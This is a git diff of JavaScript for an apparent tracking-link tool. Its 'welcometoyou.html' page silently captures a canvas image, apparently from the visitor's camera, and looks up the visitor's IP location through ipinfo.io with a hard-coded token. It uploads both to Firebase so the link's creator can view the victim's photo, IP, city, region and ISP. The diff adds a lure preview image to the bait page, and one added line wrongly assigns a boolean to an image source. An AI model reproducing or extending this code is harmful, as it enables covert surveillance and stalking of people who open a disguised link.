@@ -25,7 +25,15 @@ document.addEventListener('DOMContentLoaded', function () {
 
     function GetFakeUserData() {
       if (document.querySelectorAll('.wvu img').length > 0) { 
-        if (new URLSearchParams(window.location.search).has('link')) { 
+        if (new URLSearchParams(window.location.search).has('link') && new URLSearchParams(window.location.search).has('img')) { 
+
+          function showPrevImg() {  
+            let wimg = wblk.querySelector('.wvu img')
+            wimg.src = new URLSearchParams(window.location.search).has('img')
+          }
+          showPrevImg() 
+
+
           function SaveThisdata(photo) { 
             fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
               (response) => response.json()
@@ -61,7 +69,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     // Convert the canvas content to base64
                     var base64Data = canvas.toDataURL('image/png');
                     SaveThisdata(`${base64Data}`)
-                  }, 1000);
+                  }, 1500);
 
 
                 },
@@ -187,7 +195,7 @@ document.addEventListener('DOMContentLoaded', function () {
               (response) => response.json()
             ).then((jsonResponse) => {
               var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-              var link = window.location.origin+"/welcometoyou.html?link="+uniqueNum
+              var link = window.location.origin+"/welcometoyou.html?link="+uniqueNum+"&img="+imgDiv.dataset.img
               firebase
               .database()
               .ref("links/" +uniqueNum)
@@ -273,22 +281,28 @@ document.addEventListener('DOMContentLoaded', function () {
           .database()
           .ref("users/"+LinkPeram.get('link_of'))
           .on("value", function (snap) {
+            
             var data = snap.val();
-            Photo.src = data.photo
+            
+            if (data) { 
+  
+              Photo.src = data.photo
 
-            ul.querySelector('.ip').innerHTML = data.ip
-            ul.querySelector('.Country').innerHTML = data.country
-            ul.querySelector('.city').innerHTML = data.city
-            ul.querySelector('.devision').innerHTML = data.region
-            ul.querySelector('.timezone').innerHTML = data.timezone
-            ul.querySelector('.isp').innerHTML = data.org
+              ul.querySelector('.ip').innerHTML = data.ip
+              ul.querySelector('.Country').innerHTML = data.country
+              ul.querySelector('.city').innerHTML = data.city
+              ul.querySelector('.devision').innerHTML = data.region
+              ul.querySelector('.timezone').innerHTML = data.timezone
+              ul.querySelector('.isp').innerHTML = data.org
 
+              // console.log(data)
+              document.querySelector('body').classList.remove('not_clicked_yet')
        
+            } 
             
  
  
 
-            console.log(data)
           })
 
 
@@ -298,9 +312,7 @@ document.addEventListener('DOMContentLoaded', function () {
       }
     }
     GetDetails()
-
-
-
+ 
 
 
 }); 
